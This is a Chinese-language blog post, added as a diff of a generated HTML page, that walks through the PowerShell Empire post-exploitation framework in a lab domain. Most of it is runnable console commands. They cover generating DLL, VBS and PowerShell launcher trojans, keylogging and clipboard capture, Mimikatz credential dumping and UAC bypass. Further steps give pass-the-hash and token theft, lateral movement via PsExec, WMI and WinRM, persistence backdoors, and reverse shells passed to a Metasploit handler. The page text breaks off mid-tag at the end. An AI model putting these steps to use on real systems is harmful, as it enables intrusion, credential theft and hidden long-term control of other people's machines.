@@ -1,0 +1,253 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>PowerShell-Empire - Guko's Blog</title><meta name="description" content="Empire是一款针对winodows平台的、使用PowerShell脚本作为攻击在和的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一些列功能。Empire实现了无需Powershell.exe就可运行PowerShell代理的功能，还可以快速在后期部署漏洞利用模块，其内置有键盘记录、"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PowerShell-Empire</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PowerShell-Empire</h1><div class="post-meta">2020-03-18<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>Empire是一款针对winodows平台的、使用PowerShell脚本作为攻击在和的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一些列功能。Empire实现了无需Powershell.exe就可运行PowerShell代理的功能，还可以快速在后期部署漏洞利用模块，其内置有键盘记录、Mimikatz、绕过UAC、内网扫描等，可躲避网络检测和一些安全防护工具的茶撒谎，类似metasploit是一个基于powershell的远控木马</p>
+<a id="more"></a>
+
+<h4 id="0x01-Empire安装"><a href="#0x01-Empire安装" class="headerlink" title="0x01 Empire安装"></a>0x01 Empire安装</h4><p>下载Empire</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br></pre></td></tr></table></figure>
+
+<p>接着进入setup目录，使用如下命令安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Empire/setup/</span><br><span class="line">./install.sh</span><br><span class="line">./empire //安装好后运行Empire</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/1.png" alt></p>
+<p>输入help命令查看Empire使用帮助信息    </p>
+<p><img src="/2020/03/18/PowerShell-Empire/2.png" alt></p>
+<h4 id="0x02-设置监听"><a href="#0x02-设置监听" class="headerlink" title="0x02 设置监听"></a>0x02 设置监听</h4><p>输入<code>uselistener</code>来设置采用什么方式，使用双击Tab键可以看到一共有7种模式，分别为：dbx、http、http_com、http_foreign、http_hop、http_mapi、meterpreter、onedrive、redirector</p>
+<p><img src="/2020/03/18/PowerShell-Empire/3.png" alt></p>
+<p>这里选择<code>http</code>模式,输入命令<code>uselistener http</code>然后输入<code>info</code>命令查看具体参数设置</p>
+<p><img src="/2020/03/18/PowerShell-Empire/4.png" alt></p>
+<p>用<code>set</code>命令设置相应参数，修改<code>Name</code>，<code>Host</code>和<code>Port</code>，然后输入命令<code>execute</code>命令开始监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set Name pentest</span><br><span class="line">set Host (Empire所在服务器IP)</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/5.png" alt></p>
+<p>输入<code>back</code>命令即可返回上一层的<code>listeners</code>界面，输入<code>list</code>命令可以列出当前激活的<code>listener</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/6.png" alt></p>
+<p>注意，如果开启多个监听，必须使用不同的名称，且使用不同的端口</p>
+<p>如果要删除某个监听使用<code>kill</code>命令加上监听的<code>Name</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill [Name]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/7.png" alt></p>
+<h4 id="0x03-生成木马"><a href="#0x03-生成木马" class="headerlink" title="0x03 生成木马"></a>0x03 生成木马</h4><p>设置完监听后，接下来生成木马在目标机器上运行stager。接着输入<code>usestager</code>来采用什么模块，依旧是双击Tab键，可以看到26个模块<code>multi</code>为通用模块、<code>osx</code>mac操作系统、其他为<code>linux</code>与<code>windwos</code>生成的摁键类型有<code>dll</code>,<code>bat</code>,<code>vbs</code>等</p>
+<p><img src="/2020/03/18/PowerShell-Empire/8.png" alt></p>
+<p><strong>1、DLl木马</strong></p>
+<p>设置DLL木马，输入命令<code>usestager windows/dll</code>,用<code>info</code>命令查看详细参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usestager windows/dll</span><br><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/9.png" alt></p>
+<p>之后设置<code>Listener</code>,然后执行<code>execute</code>命令即可生成<code>launcher.dll</code>木马,把生成的木马在目标机器上运行即可上线</p>
+<p><strong>2、launcher</strong></p>
+<p>直接在监听菜单中输入<code>launcher &lt;launcher&gt; &lt;listenerName&gt;</code>即可生成一个base64的编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launcher powershell pentest</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/10.png" alt></p>
+<p>然后复制这段代码在目标机器上执行，即可上线,输入命令<code>agents</code>就可看到上线目标主机的具体内容，这里的<code>agents</code>相当于<code>metasploit</code>的会话<code>sessions</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/12.png" alt></p>
+<p>此时的<code>Name</code>会取一个随机的名字，可使用<code>rename &lt;oldAgent Name&gt; &lt;newAgentName&gt;</code>命令修改，如下所示</p>
+<p><img src="/2020/03/18/PowerShell-Empire/13.png" alt></p>
+<p><strong>3、launcher_vbs木马</strong></p>
+<p>设置<code>launcher_vbs</code>木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/launcher_vbs</span><br><span class="line">info //查看详细参数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/14.png" alt></p>
+<p>使用如下命令设置<code>Listener</code>的参数并运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set Listener pentest</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/15.png" alt></p>
+<p>在目标机器上运行<code>vbs</code>代码即可上线</p>
+<p><img src="/2020/03/18/PowerShell-Empire/16.png" alt></p>
+<p>其他的类似，就不做过多的重复性了</p>
+<h4 id="0x04-agents代理中的使用"><a href="#0x04-agents代理中的使用" class="headerlink" title="0x04 agents代理中的使用"></a>0x04 agents代理中的使用</h4><p>目标主机反弹成功后，可以使用<code>agents</code>命令列出当前已连接的主机，注如果有带有（*）的表示已提权成功的主机</p>
+<p><img src="/2020/03/18/PowerShell-Empire/17.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list stale  //列出已丢失反弹代理权</span><br><span class="line">remove stale //删除已丢失的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/18.png" alt></p>
+<p>使用<code>interact</code>命令连接主机，可使用Tab键补全主机的名称，连接成功后使用<code>help</code>命令可列出相关命令</p>
+<p><img src="/2020/03/18/PowerShell-Empire/19.png" alt></p>
+<p>输入<code>help agentcmds</code>命令可看到可供使用的常用命令，使用部分CMD命令的时候，要使用“shel+命令”的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">help agentcmds</span><br><span class="line">shell net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/20.png" alt></p>
+<p><code>sc</code>截图</p>
+<p><img src="/2020/03/18/PowerShell-Empire/21.png" alt></p>
+<p>加载<code>mimikatz</code>需要带有<code>*</code>的权限才能获取系统账号密码</p>
+<p><img src="/2020/03/18/PowerShell-Empire/41.png" alt></p>
+<p>使用<code>creds</code>命令可自动过滤，整理出获取的用户密码</p>
+<p><img src="/2020/03/18/PowerShell-Empire/42.png" alt></p>
+<p>输入<code>creds</code>命令后双击Tab键，可看到一些选项,在密码较多且杂乱的时候可通过<code>hash/plaintext</code>进行排列、增加、删除、导出等操作，导出凭据存储，输入<code>creds export 目录/xx.csv</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/43.png" alt></p>
+<h4 id="0x05-信息收集"><a href="#0x05-信息收集" class="headerlink" title="0x05 信息收集"></a>0x05 信息收集</h4><p>Empire主要用于后渗透，信息收集模块比较常用，可以使用<code>search module</code>命令搜索需要的模块<code>usemodule collection</code>然后用Tab键查看完整的列表</p>
+<p><img src="/2020/03/18/PowerShell-Empire/22.png" alt></p>
+<p><strong>1、屏幕截图</strong></p>
+<p>输入如下命令可查看该模块具体参数，输入<code>execute</code>命令截图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule collection/screenshot</span><br><span class="line">info</span><br><span class="line">execute //截图</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/23.png" alt></p>
+<p><strong>2、键盘记录</strong></p>
+<p>输入如下命令可查看该模块具体参数，输入<code>execute</code>命令启动后就开始记录目标主机的键盘输入情况了，此时会自动在<code>/Empire/downloads/&lt;AgenName&gt;</code>下生成一个<code>agent.log</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule collection/keylogger</span><br><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/24.png" alt></p>
+<p>在目标主机上输入字符，这边即可查看到</p>
+<p><img src="/2020/03/18/PowerShell-Empire/25.png" alt></p>
+<p>如果要持续进行键盘记录，可以把当前监控模块置于后台</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jobs //显示当前在后台的记录</span><br><span class="line">jobs kill D1ZFSR //停止键盘记录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/26.png" alt></p>
+<p><strong>3、剪贴板记录</strong></p>
+<p>这个模块允许用户抓取存储在目标主机windows剪贴板上的任何类型，可设置参数抓取时间的限制和间隔，默认即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule collection/clipboard_monitor</span><br><span class="line">info</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/27.png" alt></p>
+<p>在目标主机上随意复制一句话，就可看到屏幕上依旧显示了</p>
+<p><img src="/2020/03/18/PowerShell-Empire/28.png" alt></p>
+<p>监控模块置于后台，显示当前后台的记录跟停止，跟上一个相同</p>
+<p><strong>4、查找共享</strong></p>
+<p>输入如下命令列出域内所有的共享</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/share_finder</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>这里显示查找完毕，并为列出的原因是因为不是域环境</p>
+<p><img src="/2020/03/18/PowerShell-Empire/29.png" alt></p>
+<p><img src="/2020/03/18/PowerShell-Empire/30.png" alt><br><strong>5、收集目标主机信息</strong></p>
+<p>输入如下命令，即可查看本机用户、域组成员、最后密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenum</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/31.png" alt></p>
+<p>如下命令，几乎列举了系统中所有有用信息、目标主机时间日志、应用程序策略日志、RDP登录信息、Powershell脚本运行和保存信息</p>
+<p><strong>6、ARP扫描</strong></p>
+<p>Empire中内置了ARP扫描模块，输入如下命令即可使用该模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/arpscan</span><br><span class="line">set Range 192.168.1.0-192.168.1.10 //设置扫描范围</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/32.png" alt></p>
+<p><strong>7、DNS信息获取</strong></p>
+<p>在内网中，知道所有机器HostName和对应的IP地址对分析内网结构直观重要，输入<code>usemodule situational_awareness/network/reverse_dns</code>   命令可使用该模块，这里要设置<code>Range</code>参数，输入要扫描的IP段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/reverse_dns</span><br><span class="line">set Range 192.168.1.0-192.168.1.10</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/33.png" alt></p>
+<p>如果存在两个网卡，也会显示出来，方便寻找边界主机</p>
+<p>另一个模块<code>usemodule situational_awareness/host/dnsserver</code>显示当前内网DNS服务器的IP地址</p>
+<p><img src="/2020/03/18/PowerShell-Empire/34.png" alt></p>
+<p><strong>8、查找域管登录服务器IP</strong></p>
+<p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域控，<code>usemodule situational_awareness/netneflwork/powerview/user_hunter</code>这个模块就是用来查找域管登录机器的，它可以清除看到哪位用户登录了哪台主机</p>
+<p><img src="/2020/03/18/PowerShell-Empire/35.png" alt></p>
+<p><strong>9、本地管理组访问模块</strong></p>
+<p>使用如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/find_localadmin_access</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><strong>10、获取域控制器</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/get_domain_controller</span><br><span class="line">execute</span><br><span class="line">shell dir \\DC\c$ //验证是否能访问域服务器的“C$”</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/36.png" alt></p>
+<h4 id="0x06-权限提升"><a href="#0x06-权限提升" class="headerlink" title="0x06 权限提升"></a>0x06 权限提升</h4><p>提权，提高自己在服务器中的权限，如Guest，通过提权后变成超级管理员权限</p>
+<p><strong>1、Bypass UAC</strong></p>
+<p>如下命令，成功的话会上线一个新的反弹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac</span><br><span class="line">set Listener pentes //设置参数</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、bypassuac_wscript</strong></p>
+<p>大致原理是使用<code>C:\Windows\wscript.exe执行payload.exe</code>,既绕过UAC实现管理员权限执行payload，只适用于Windows7系统，目前尚未有对应补丁，<code>注，在域环境中测试的时候会弹出输入域用户跟账号后才能成功,尚不清楚原理，这样实战貌似效果不大</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac_wscript</span><br><span class="line">set Listener pentest</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/37.png" alt></p>
+<p><strong>3、PowerUp</strong></p>
+<p>Empire内置<code>PowerUp</code>的部分工具，用于系统提权，主要有windows错误系统配置漏洞，Windows Services漏洞、AlwayslnstallElevated漏洞等8种提权方式。输入<code>usemodule privesc/powerup/</code>命令然后Tab键查看其完整列表</p>
+<p><img src="/2020/03/18/PowerShell-Empire/38.png" alt></p>
+<p>(1) AllChecks模块</p>
+<p>查找系统中的漏洞，和<code>PowerSploit</code>下<code>PowerUp</code>中的<code>Invoke-AllChecks</code>模块一样，该模块可执行所有脚本检查系统漏洞，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/powerup/allchecks</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/39.png" alt></p>
+<p>(2) 模块使用说明</p>
+<p>AllChecks模块的应用对象如下表示</p>
+<ul>
+<li>任何没有引号的服务路径</li>
+<li>任何ACL配置错误的服务（可通过service_*利用）</li>
+<li>服务可执行文件上的任何设置不当的权限（可通过service_exe_*进行利用）</li>
+<li>任何剩余<code>unattend.xml</code>文件</li>
+<li>设置<code>AlwayslnstallElevated</code>注册表项</li>
+<li>如果有任何<code>Autologon</code>凭证留在注册表中</li>
+<li>任何加密<code>web.config</code>字符串和应用程序池密码</li>
+<li>对于任何%PATH%.DLL的劫持计划（可用过write_dllhijacker利用）</li>
+</ul>
+<p>参考如下</p>
+<p>////</p>
+<p><strong>4、GPP</strong></p>
+<p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，缺点是任何普通用户都可以从相关域控制器SYSVOL中读取部署信息。GPP是采用AES加密，查看命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/gpp</span><br><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/40.png" alt></p>
+<h4 id="0x07-横向渗透"><a href="#0x07-横向渗透" class="headerlink" title="0x07 横向渗透"></a>0x07 横向渗透</h4><p>在我们获取服务器权限后，可m使用<code>mimikatz</code>获取系统密码，执行完后输入<code>creds</code>命令可查看其列举的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">creds</span><br><span class="line">pth 1</span><br><span class="line">steal_token</span><br><span class="line">shell dir \\SERVER-2008-R2\c$</span><br><span class="line">revtoself</span><br><span class="line">ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/44.png" alt></p>
+<p>可以发现有域用户曾在此服务器上登录，这时可以窃取域用户身份，然后进行横向移动，首先窃取身份，使用<code>pth&lt;ID&gt;</code>    命令，这里的ID号是cerds下的CredID号，窃取Administrator身份令牌，执行<code>pth 1</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/46.png" alt></p>
+<p>看到进程PID为2352，使用<code>steal_token PID</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/47.png" alt></p>
+<p>也可以用<code>ps</code>    命令查看是否有域用户的进程，同样可以通过<code>steal_token</code>命令来获取，这里尝试访问域内的另一台<code>\\SERVER-2008-R2</code>的<code>c$</code>,顺利访问</p>
+<p><img src="/2020/03/18/PowerShell-Empire/48.png" alt></p>
+<p>使用<code>revtoself</code>命令恢复要原始状态</p>
+<p><img src="/2020/03/18/PowerShell-Empire/49.png" alt></p>
+<p><strong>2、会话注入</strong></p>
+<p>选择<code>psinject</code>模块进行会话注入，直接输入<code>ps</code>选择一个进程<code>PID</code>使用进程注入模块,需要设置<code>ProcId</code>和<code>Listener</code>,运行后会反弹回一个域用户权限的<code>shell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule management/psinject</span><br><span class="line">info</span><br><span class="line">set ProcId</span><br><span class="line">set Listener</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/45.png" alt></p>
+<p><strong>3、Invoke-PsExec</strong></p>
+<p>缺点被杀毒软件检测留下日志，需开启admin$445端口共享，优点可直接返回<code>SYSTEM</code>权限，使用前提，已获得本地管理员权限，甚至域管理员账户，从而进一步渗透内网</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/powerview/find_localadmin_access //查找整个域中全部计算机名</span><br><span class="line">usemodule lateral_movement/invoke_psexec</span><br><span class="line">set ComputerName SERVER-2008-R2.hacke.testlab</span><br><span class="line">set Listener WC</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>先查找整个域中的计算机名</p>
+<p><img src="/2020/03/18/PowerShell-Empire/50.png" alt></p>
+<p>设置参数，由于2008测试未成功，就直接用的自己打自己。。。</p>
+<p><img src="/2020/03/18/PowerShell-Empire/51.png" alt></p>
+<p><strong>4、Invoke-WMI</strong></p>
+<p>所有windows系统均启用，不会记录日志操作，攻击无需写入磁盘，隐蔽性高，如启动了防火墙，则WMI无法连接目标机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WIN7-X64-TEST.hacke.testlab</span><br><span class="line">set ComputerName SERVER-2008-R2.hacke.testlab</span><br><span class="line">set Listener WC</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/52.png" alt></p>
+<p><strong>5、PowerShell Remoting</strong></p>
+<p>Powershell Remoting是powershell的远程管理功能，开启Windows远程管理服务WInRM系统后回监听5985端口，该服务在windows server2012中是启动的，Windows server 2003/2008/2008 R2 需要手动启动</p>
+<p>如目标开启该服务，或拥有其权限的凭据，则可用如下命令横向渗透</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_psremoting</span><br><span class="line">set ComputerName</span><br><span class="line">set Listener</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x08-后门"><a href="#0x08-后门" class="headerlink" title="0x08 后门"></a>0x08 后门</h4><p>后门的主要目的是方便以后再次秘密进入或控制系统</p>
+<p><strong>1、权限持久化劫持Shift后门</strong></p>
+<p>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger</span><br><span class="line">set Listener</span><br><span class="line">set ComputerName WIN7-X64-TEST.hacke.testlab</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>运行后，在目标主机登录窗口按5次<code>Shift</code>键即可触发后门</p>
+<p><img src="/2020/03/18/PowerShell-Empire/53.png" alt></p>
+<p><code>sethc.exe</code>可以替换以下几项</p>
+<ul>
+<li>Utilman.exe(使用Win+U组合键启动)</li>
+<li>Ask.exe(屏幕上的键盘：使用Win + U启动组合键)</li>
+<li>Narrator.exe(启动讲述人:使用Win + U启动组合键)</li>
+<li>Magnify.exe(放大镜：使用Win + U组合键启动)</li>
+</ul>
+<p><strong>2、注册表注入后门</strong></p>
+<p>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/registry*</span><br><span class="line">set Listener </span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>重启目标机,会弹个黑框，之后就会收到反弹的<code>shell</code></p>
+<p><img src="/2020/03/18/PowerShell-Empire/54.png" alt></p>
+<p><strong>3、计划任务</strong></p>
+<p>命令如下，计划任务获取的权限是<code>SYSTEM</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/schtasks*</span><br><span class="line">set DailyTime   //设置时间</span><br><span class="line">set Listener</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/18/PowerShell-Empire/55.png" alt></p>
+<h4 id="0x09-Empire联动Metasploit"><a href="#0x09-Empire联动Metasploit" class="headerlink" title="0x09 Empire联动Metasploit"></a>0x09 Empire联动Metasploit</h4><p>在实际渗透中，当拿到webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用powershell绕过，也可以执行Empire的payload来绕过，成功后使用Empire模块将其反弹回Metasploit</p>
+<p>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Empire设置</span><br><span class="line">usemodule code_execution/invoke_shellcode</span><br><span class="line">set Lhost</span><br><span class="line">set Lport</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">然后在msf设置</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br><span class="line">set LHOST</span><br><span class="line">set LPORT</span><br></pre></td></tr></table></figure>
+
+<p>测试的时候发现一直弹不回，原因暂时未知….</p>
+<p>参考资料</p>
+<p><a href="http://www.powershellempire.com/?page_id=133" target="_blank" rel="noopener">http://www.powershellempire.com/?page_id=133</a></p>
+<p>​    <a href="https://www.freebuf.com/sectool/158393.html" target="_blank" rel="noopener">PowerShell Empire实战入门篇</a>    </p>
+<p>《Web安全攻防渗透实战指南》</p>
+</div><!--文章标签--><div class="tags"><a href="/tags/PowerShell/">PowerShell</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 18px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 15px;">PowerShell</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/远程代码执行/" style="font-size: 15px;">远程代码执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/免杀/" style="font-size: 18px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a 